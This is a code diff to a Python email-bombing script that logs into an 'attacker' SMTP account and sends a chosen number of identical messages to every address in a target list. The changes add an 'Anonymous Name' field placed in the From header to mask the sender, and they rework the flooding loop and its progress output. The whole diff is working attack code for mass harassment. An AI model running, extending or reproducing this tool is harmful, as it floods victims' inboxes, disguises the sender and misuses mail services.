@@ -36,7 +36,7 @@ def multiple_emails():
         if answer == '1':
             number = 1
         elif answer == '2':
-            print('[bold red] [WARNING][/bold red] This could take a long time\n and/or may not be able to send all the emails! ')
+            print('\n[bold red] [WARNING][/bold red] This could take a long time\n and/or may not be able to send all the emails! ')
             warning = input('\n [return] -> ')
             number = input('\n Number of Emails: ')
         elif answer == '3':
@@ -49,14 +49,14 @@ def multiple_emails():
             sys.exit()
 
         message = MIMEMultipart()
+        username = input('\n Anonymous Name: ')
         sender_email = input('\n Attacker Email: ')
         password = getpass('\n Attacker Password: ')
         subject = input('\n Subject: ')
         body = input('\n Message: ')
         message.attach(MIMEText(body, 'plain'))
 
-        print('\n Are you using gmail [y/n]? ')
-        server = input('\n ->')
+        server = input('\n Are you using gmail [y/n]? ')
         if server == 'y':
             port = 587
             smtp = 'smtp.gmail.com'
@@ -85,18 +85,18 @@ def multiple_emails():
                 server.ehlo()
                 server.starttls()
                 server.login(sender_email, password)
-                for receiver_email in track(email_list, description='[bold red] Sending Emails...'):
-                    for i in range(1, int(number) + 1):
-                        message['From'] = sender_email
-                        message['To'] = receiver_email
+                for email in email_list:
+                    for i in track(range(1, int(number) + 1), description=f"[bold cyan] Sending to {email}..."):
+                        message['From'] = username
+                        message['To'] = email
                         message['Subject'] = subject
                         text = message.as_string()
-                        server.sendmail(sender_email, receiver_email, text)
                         sleep(1)
+                        server.sendmail(sender_email, email, text)
                         sys.stdout.flush()
                 server.quit()
             print('[bold cyan]\n Bomb Completed!')
-            print('[bold cyan] E-mails sent: %i' % len(email_list))
+            print(f"[bold cyan]  {number} E-mails sent! ")
             sys.exit()
 
         except KeyboardInterrupt:
